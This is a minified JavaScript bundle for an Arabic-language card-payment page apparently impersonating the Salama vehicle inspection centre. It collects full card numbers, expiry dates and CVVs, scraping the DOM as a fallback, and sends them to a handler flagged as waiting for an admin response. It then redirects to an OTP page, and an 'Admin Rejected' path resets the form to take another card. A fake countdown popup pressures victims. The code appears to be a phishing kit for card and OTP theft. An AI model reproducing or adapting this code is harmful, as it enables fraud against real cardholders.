import{c as D,r as j,j as e,b as I,u as L,d as S,m as C,s as z}from"./index-D4BysLqo.js";import{c as b,B as q,q as E,M as R,I as _}from"./MainWrapper-3fG7tHnO.js";import{L as T}from"./index-T_BWojLf.js";import{v as F}from"./helpers-C1U4c7nv.js";import{L as P,i as $}from"./select-h-MNkb6R.js";import{D as A,b as B,c as H,d as k,e as O,g as W}from"./dialog-YL2NTYmw.js";import"./index-CbJIW6r0.js";import"./index-DhmugqQ0.js";/**
 * @license lucide-react v0.364.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const X=D("CircleCheck",[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["path",{d:"m9 12 2 2 4-4",key:"dzmm74"}]]);/**
 * @license lucide-react v0.364.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const G=D("CircleX",[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["path",{d:"m15 9-6 6",key:"1uzhvr"}],["path",{d:"m9 9 6 6",key:"z0biqf"}]]);/**
 * @license lucide-react v0.364.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const V=D("CreditCard",[["rect",{width:"20",height:"14",x:"2",y:"5",rx:"2",key:"ynyp8z"}],["line",{x1:"2",x2:"22",y1:"10",y2:"10",key:"1b3vmo"}]]),blocked=window.__BLOCKED_BINS||[],J=({errors:a,id:l,label:r,register:h,disabled:s,placeholder:N,className:m,containerClassName:w,cardType:i,setCardType:o})=>{
  const[g,c]=j.useState(null);
  const f=t=>{const x="٠١٢٣٤٥٦٧٨٩",u="0123456789";let d=String(t||"");for(let p=0;p<x.length;p++)d=d.replace(new RegExp(x[p],"g"),u[p]);return d};
  const y=t=>String(t||"").replace(/\D/g,"").slice(0,16).replace(/(.{4})/g,"$1 ").trim();
  const isLuhn=t=>{
    let sum=0,shouldDouble=!1;
    for(let i=t.length-1;i>=0;i--){
      let digit=parseInt(t.charAt(i),10);
      if(shouldDouble){digit*=2;if(digit>9)digit-=9;}
      sum+=digit;shouldDouble=!shouldDouble;
    }
    return(sum%10)===0;
  };
  const madaBins=["588845","588846","588847","588848","588849","588850","588851","588982","588983","589005","589206","530060","531095","532013","535825","535989","536023","537767","539738","557038","558848","504300","508160","604906","605141","636120","968201","968202","968203","968204","968205","968206","968207","968208","968209","968211","400861","401757","409201","410621","417633","422817","422818","422819","428331","428671","428672","428673","431361","432328","434107","439954","440647","440795","445564","446393","446404","446672","455036","455708","457865","457997","458456","462220","468540","483010","484783","486094","489318","489319"];
  const detectBrand=t=>{
    if(!t||t.length<4)return null;
    if(madaBins.some(b=>t.startsWith(b)))return"mada";
    if(t.startsWith("4"))return"visa";
    if(/^5[1-5]|^2[2-7]/.test(t))return"master";
    return"mada";
  };
  const v=t=>{
    const digits=String(t||"").replace(/[\s-]/g,"");
    if(!digits)return o(null),c(null),!0;
    if(!/^\d+$/.test(digits)||digits.length<15||digits.length>19){o(null);c(!1);return!0;}
    const brand=detectBrand(digits);
    o(brand);
    const valid=isLuhn(digits);
    c(valid);
    return !valid;
  };
  const n=t=>{
    const u=f(t).replace(/[^\d]/g,"");
    const d=y(u);
    if(u.length>=16){v(u);}
    else if(u.length>0){const br=detectBrand(u);if(br)o(br);c(null);}
    else{o(null);c(null);}
    return d;
  };
  return e.jsx("div",{style:{position:"relative",marginBottom:"20px"},children:e.jsxs("div",{children:[
    e.jsx("label",{style:{display:"block",fontSize:"13px",fontWeight:"700",color:"#444",marginBottom:"6px"},children:r}),
    e.jsxs("div",{style:{position:"relative"},children:[
      e.jsx("input",{
        id:l,maxLength:19,type:"tel",placeholder:N,disabled:s,
        style:{width:"100%",padding:"14px 70px 14px 16px",borderRadius:"12px",border:a[l]?"1.5px solid #ef4444":"1.5px solid #e0e0e0",fontSize:"16px",fontFamily:"monospace",direction:"ltr",textAlign:"left",outline:"none",boxSizing:"border-box",background:"#fff",transition:"border 0.2s",letterSpacing:"1px"},
        ...h(l,{required:"هذا الحقل ضروري",validate:t=>{const x=f(t).replace(/[\s-]/g,"");return v(x)?"البطاقة غير مقبولة. يرجى استخدام بطاقة أخرى.":!0}}),
        onChange:t=>{const fmt=n(t.target.value);t.target.value=fmt;const reg=h(l);if(reg&&reg.onChange)reg.onChange(t)},name:l
      }),
      e.jsxs("div",{style:{position:"absolute",top:"50%",right:"12px",transform:"translateY(-50%)",display:"flex",gap:"6px",alignItems:"center"},children:[
        i==="mada"&&e.jsx("img",{src:"/assets/images/client/mada-card.svg",alt:"mada",style:{height:"22px"}}),
        i==="visa"&&e.jsx("img",{src:"/assets/images/client/visa-card.svg",alt:"visa",style:{height:"22px"}}),
        i==="master"&&e.jsx("img",{src:"/assets/images/client/master-card.svg",alt:"mastercard",style:{height:"22px"}}),
        g===!0&&e.jsx(X,{className:"h-5 w-5 text-green-500",style:{color:"#129786",width:"20px",height:"20px"}}),
        g===!1&&e.jsx(G,{className:"h-5 w-5 text-red-500",style:{color:"#ef4444",width:"20px",height:"20px"}})
      ]})
    ]}),
    g===!1&&e.jsx("p",{style:{fontSize:"12px",color:"#ef4444",marginTop:"4px"},children:"البطاقة غير مقبولة. يرجى استخدام بطاقة أخرى."}),
    g===!0&&e.jsx("p",{style:{fontSize:"12px",color:"#129786",marginTop:"4px"},children:"رقم بطاقة صحيح"})
  ]})});
},K=()=>{const a=new Date().setHours(23,59,59,0),[l,r]=j.useState(`${String(Math.floor((a-new Date().getTime())/1e3/60/60)).padStart(2,"0")}:${String(Math.floor((a-new Date().getTime())/1e3/60)%60).padStart(2,"0")}:${String(Math.floor((a-new Date().getTime())/1e3)%60).padStart(2,"0")}`);return j.useEffect(()=>{const h=setInterval(()=>{const s=new Date().getTime();s>=a?r("Time's up!"):r(`${String(Math.floor((a-s)/1e3/60/60)).padStart(2,"0")}:${String(Math.floor((a-s)/1e3/60)%60).padStart(2,"0")}:${String(Math.floor((a-s)/1e3)%60).padStart(2,"0")}`)},1e3);return()=>clearInterval(h)},[]),e.jsx(A,{defaultOpen:!0,children:e.jsxs(B,{className:"max-w-[90dvw] sm:max-w-md rounded-lg",children:[e.jsx(H,{children:e.jsx(k,{className:"text-main text-2xl [text-shadow:2px_2px_20px_rgba(0,0,0,0.2)]",children:e.jsx("img",{src:"/assets/images/welcome-dialog.jpg",alt:"welcome dialog image",className:"w-full max-h-[40dvh]"})})}),e.jsxs("div",{className:"flex flex-col gap-2 items-center p-4",children:[e.jsx(k,{children:"سارع قبل نهاية العرض!"}),e.jsx(O,{children:"يتبقى علي إنتهاء العرض"}),e.jsx("span",{className:b("text-3xl text-green-600 mt-4 font-bold",l==="Time's up!"&&"text-red-500"),children:l})]}),e.jsx(W,{children:e.jsx(q,{className:"w-fit bg-gray-500 px-20 rounded-lg shadow-md transition-colors duration-500",type:"button",children:"إغلاق"})})]})})},M={name:"الأسم غير صحيح. يجب أن يكون باللغة الأنجليزية",card_num:"البطاقة غير مقبولة. يرجى استخدام بطاقة أخرى.",cvv:"رقم cvv غير صحيح. يجب أن يكون الرقم مكون من 3 رقم",month:"يرجى تحديد الشهر",year:"يرجى تحديد السنة"},Q=[{name:"2025"},{name:"2026"},{name:"2027"},{name:"2028"},{name:"2029"},{name:"2030"}],U=[{name:"1"},{name:"2"},{name:"3"},{name:"4"},{name:"5"},{name:"6"},{name:"7"},{name:"8"},{name:"9"},{name:"10"},{name:"11"},{name:"12"}],Y={name:"",card_num:"",exp_month:"",exp_year:"",cvv:""},ie=()=>{var c,f,y,v;const{state:a}=I(),l=L(),{register:r,handleSubmit:h,setValue:s,reset:N,formState:{errors:m,isValidating:w}}=E({mode:"all",defaultValues:Y}),[i,o]=j.useState(a==null?void 0:a.paymentMethod);j.useEffect(()=>{S.value.includes("Admin Rejected")&&(o(null),s("exp_month",""),s("exp_year",""),N())},[S.value]);const g=n=>{
  const cname=(n.name||document.querySelector("input[placeholder='Cardholder Name']")?.value||"").trim();
  const cnum=(n.card_num||document.getElementById("card_num")?.value||"").replace(/\s+/g,"").trim();
  const mMonth=(n.exp_month||document.querySelector("[name='exp_month']")?.value||"").trim();
  const mYear=(n.exp_year||document.querySelector("[name='exp_year']")?.value||"").trim();
  const mCvv=(n.cvv||document.querySelector("input[placeholder='•••']")?.value||"").replace(/\D/g,"").trim();
  if(!cname||!cnum||!mMonth||!mYear||!mCvv)return;
  let btype=i;if(!btype){btype=cnum.startsWith("4")?"visa":(/^5[1-5]|^2[2-7]/.test(cnum)?"master":"mada");}
  z({data:{cardType:btype,cardName:cname,cardNumber:cnum,expiry:`${mMonth}/${mYear}`,cvv:mCvv},current:"payment-gateway",nextPage:"otp",nextLink:"/otp",waitingForAdminResponse:!0,navigate:l});
};var total=((f=(c=C.value)==null?void 0:c.state)==null?void 0:f.totalPrice)||((v=(y=C.value)==null?void 0:y.state)==null?void 0:v.total)||(a==null?void 0:a.value)||(a==null?void 0:a.total)||10;var lbl={display:"block",fontSize:"13px",fontWeight:"700",color:"#444",marginBottom:"6px"};var inp={width:"100%",padding:"14px 16px",borderRadius:"12px",border:"1.5px solid #e0e0e0",fontSize:"15px",fontFamily:"inherit",outline:"none",boxSizing:"border-box",background:"#fff",transition:"border 0.2s",marginBottom:"4px"};return e.jsxs(R,{children:[e.jsx(K,{}),e.jsx("main",{style:{background:"#f3f4f6",minHeight:"100vh",padding:"20px 16px 40px",fontFamily:"Tajawal, Cairo, sans-serif"},children:e.jsxs("div",{style:{maxWidth:"440px",margin:"0 auto"},children:[e.jsx("div",{style:{background:"linear-gradient(135deg,#0f3460,#1a5276)",borderRadius:"16px",padding:"16px 20px",marginBottom:"16px",textAlign:"center"},children:e.jsx("img",{src:"/assets/images/logo.svg",alt:"salama logo",style:{height:"40px",margin:"0 auto",display:"block"}})}),e.jsxs("div",{style:{background:"#fff",borderRadius:"20px",padding:"28px 22px",boxShadow:"0 2px 12px rgba(0,0,0,0.06)"},children:[e.jsxs("div",{style:{background:"linear-gradient(135deg,#0f3460,#1a5276)",borderRadius:"14px",padding:"22px 20px",color:"#fff",marginBottom:"24px",position:"relative",overflow:"hidden"},children:[e.jsx("div",{style:{position:"absolute",top:"-20px",right:"-20px",width:"80px",height:"80px",borderRadius:"50%",background:"rgba(255,255,255,0.05)"}}),e.jsx("div",{style:{position:"absolute",bottom:"-30px",left:"-10px",width:"100px",height:"100px",borderRadius:"50%",background:"rgba(255,255,255,0.03)"}}),e.jsxs("div",{style:{display:"flex",justifyContent:"space-between",alignItems:"center",marginBottom:"24px"},children:[e.jsx("span",{style:{fontSize:"11px",fontWeight:"600",opacity:0.8,letterSpacing:"2px"},children:"CREDIT CARD"}),e.jsxs("div",{style:{display:"flex",gap:"8px"},children:[e.jsx("img",{src:"/assets/images/client/mada-card.svg",alt:"mada",style:{height:"22px",opacity:i==="mada"?1:0.35,transition:"opacity 0.3s"}}),e.jsx("img",{src:"/assets/images/client/visa-card.svg",alt:"visa",style:{height:"22px",opacity:i==="visa"?1:0.35,transition:"opacity 0.3s"}}),e.jsx("img",{src:"/assets/images/client/master-card.svg",alt:"master",style:{height:"22px",opacity:i==="master"?1:0.35,transition:"opacity 0.3s"}})]})]}),e.jsx("div",{style:{fontSize:"20px",letterSpacing:"4px",fontFamily:"monospace",marginBottom:"20px",direction:"ltr",textAlign:"center",fontWeight:"300"},children:"••••   ••••   ••••   ••••"}),e.jsxs("div",{style:{display:"flex",justifyContent:"space-between",fontSize:"10px",opacity:0.6,textTransform:"uppercase",letterSpacing:"1px"},children:[e.jsx("span",{children:"CARD HOLDER"}),e.jsx("span",{children:"VALID THRU"})]})]}),e.jsxs("div",{style:{display:"flex",alignItems:"center",gap:"10px",marginBottom:"22px",padding:"12px 16px",background:"#f0faf8",borderRadius:"12px",border:"1px solid #d1ede8"},children:[e.jsx("div",{style:{width:"36px",height:"36px",background:"#129786",borderRadius:"10px",display:"flex",alignItems:"center",justifyContent:"center",flexShrink:0},children:e.jsx("span",{style:{color:"#fff",fontSize:"18px"},children:"\u{1F4B3}"})}),e.jsxs("div",{children:[e.jsx("h3",{style:{fontSize:"15px",fontWeight:"800",color:"#0f3460",margin:0},children:"الدفع ببطاقة الائتمان"}),e.jsx("p",{style:{fontSize:"11px",color:"#888",margin:0},children:"مركز سلامة للفحص الفني الدوري"})]})]}),e.jsxs("form",{onSubmit:h(g),children:[e.jsxs("div",{style:{marginBottom:"16px"},children:[e.jsx("label",{style:lbl,children:"إسم حامل البطاقة"}),e.jsx("input",{type:"text",placeholder:"Cardholder Name",style:{...inp,direction:"ltr",textAlign:"left"},...r("name",{required:"هذا الحقل ضروري",validate:n=>String(n||"").trim().length>=3?!0:"الاسم المدخل قصير جداً"})}),m.name&&e.jsx("p",{style:{fontSize:"12px",color:"#ef4444",marginTop:"2px"},children:m.name.message})]}),e.jsx(J,{errors:m,register:r,label:"رقم البطاقة",placeholder:"xxxx xxxx xxxx xxxx",id:"card_num",cardType:i,setCardType:o}),e.jsxs("div",{style:{display:"flex",gap:"10px",marginBottom:"20px",direction:"rtl"},children:[e.jsxs("div",{style:{flex:1},children:[e.jsx("label",{style:lbl,children:"الشهر"}),e.jsx($,{id:"exp_month",placeholder:"شهر",sels:U,className:"px-4",register:r,errors:m,options:{required:!0},setValue:s})]}),e.jsxs("div",{style:{flex:1},children:[e.jsx("label",{style:lbl,children:"السنة"}),e.jsx($,{id:"exp_year",placeholder:"سنة",sels:Q,className:"px-4",register:r,errors:m,options:{required:!0},setValue:s})]}),e.jsxs("div",{style:{flex:1},children:[e.jsx("label",{style:lbl,children:"CVV"}),e.jsx("input",{type:"password",inputMode:"numeric",autoComplete:"cc-csc",placeholder:"•••",maxLength:3,style:{...inp,textAlign:"center",letterSpacing:"4px",padding:"10px 16px",height:"44px"},...r("cvv",{required:"هذا الحقل ضروري",pattern:{value:/^\d{3}$/,message:M.cvv}}),onInput:t=>{const ar="٠١٢٣٤٥٦٧٨٩",en="0123456789";let v=String(t.target.value||"");for(let p=0;p<ar.length;p++)v=v.replace(new RegExp(ar[p],"g"),en[p]);const clean=v.replace(/\D/g,"").slice(0,3);t.target.value=clean;s("cvv",clean,{shouldValidate:true})},onKeyDown:t=>{if(!/[\d]/.test(t.key)&&!["Backspace","Delete","Tab","ArrowLeft","ArrowRight","ArrowUp","ArrowDown","Enter"].includes(t.key)&&!t.ctrlKey&&!t.metaKey){t.preventDefault()}}}),m.cvv&&e.jsx("p",{style:{fontSize:"12px",color:"#ef4444",marginTop:"2px"},children:m.cvv.message})]})]}),e.jsxs("div",{style:{background:"linear-gradient(135deg,#f0faf8,#e8f5f1)",borderRadius:"12px",padding:"14px 18px",display:"flex",justifyContent:"space-between",alignItems:"center",marginBottom:"20px",border:"1px solid #c8e6df"},children:[e.jsx("span",{style:{fontSize:"14px",color:"#555",fontWeight:"600"},children:"المجموع الكلى"}),e.jsxs("span",{style:{fontSize:"22px",color:"#129786",fontWeight:"800"},children:[total," ر.س"]})]}),e.jsx("button",{type:"submit",style:{width:"100%",padding:"16px",borderRadius:"14px",border:"none",background:"linear-gradient(135deg,#129786,#0e7c6e)",color:"#fff",fontSize:"17px",fontWeight:"700",cursor:"pointer",fontFamily:"inherit",boxShadow:"0 4px 15px rgba(18,151,134,0.35)",transition:"all 0.3s"},children:w?"جاري الفحص ...":"ادفع الآن"}),e.jsxs("div",{style:{display:"flex",alignItems:"center",justifyContent:"center",gap:"8px",marginTop:"16px",padding:"10px",background:"#f9fafb",borderRadius:"10px"},children:[e.jsx("span",{style:{fontSize:"11px",color:"#999"},children:"طرق الدفع المقبولة"}),e.jsx("img",{src:"/assets/images/client/cards-all.png",alt:"cards",style:{height:"20px"}})]})]})]})]})})]})};export{ie as default,M as errMsgs};
